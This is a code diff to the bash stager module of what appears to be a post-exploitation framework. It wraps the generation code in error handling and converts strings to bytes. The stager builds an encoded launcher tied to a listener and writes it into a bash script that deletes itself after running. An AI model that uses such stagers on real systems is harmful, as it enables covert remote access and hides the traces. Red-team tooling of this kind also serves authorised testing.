@@ -61,23 +61,29 @@ class Stager(object):
                 self.options[option]['Value'] = value
 
     def generate(self):
+        try:
+            # extract all of our options
+            language = self.options['Language']['Value']
+            listenerName = self.options['Listener']['Value']
+            userAgent = self.options['UserAgent']['Value']
+            safeChecks = self.options['SafeChecks']['Value']
 
-        # extract all of our options
-        language = self.options['Language']['Value']
-        listenerName = self.options['Listener']['Value']
-        userAgent = self.options['UserAgent']['Value']
-        safeChecks = self.options['SafeChecks']['Value']
+            # generate the launcher code
+            launcher = self.mainMenu.stagers.generate_launcher(listenerName, language=language, encode=True, userAgent=userAgent, safeChecks=safeChecks)
 
-        # generate the launcher code
-        launcher = self.mainMenu.stagers.generate_launcher(listenerName, language=language, encode=True, userAgent=userAgent, safeChecks=safeChecks)
+            if launcher == b"":
+                print(helpers.color("[!] Error in launcher command generation."))
+                return ""
 
-        if launcher == "":
-            print(helpers.color("[!] Error in launcher command generation."))
-            return ""
+            else:
+                script = b"#!/bin/bash\n"
+                script += b"%s\n" %(launcher)
+                script += b"rm -f \"$0\"\n"
+                script += b"exit\n"
+                return script
+        except Exception as e:
+            import sys, traceback
+            print(helpers.color("[!] Error generating: {}".format(e)))
+            exc_type, exc_val, exc_tb = sys.exc_info()
+            traceback.print_tb(exc_tb, file=sys.stdout)
 
-        else:
-            script = "#!/bin/bash\n"
-            script += "%s\n" %(launcher)
-            script += "rm -f \"$0\"\n"
-            script += "exit\n"
-            return script
